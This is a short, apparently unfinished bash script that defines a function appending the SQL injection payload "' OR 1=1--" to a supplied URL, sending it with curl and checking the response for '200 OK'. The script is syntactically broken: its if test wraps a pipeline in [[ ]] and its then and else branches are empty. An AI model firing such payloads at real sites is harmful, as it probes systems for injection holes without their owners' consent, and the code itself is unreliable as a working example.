#!/bin/bash
function 3_sqli() {
URL=$(echo -e "$url")
SQLi="%27+OR+1=1--"
ATTACK="$URL$SQLi"
curl -i $ATTACK | grep "200 OK"
if [[ curl -i $ATTACK | grep "200 OK" ]]
then
else
fi
}
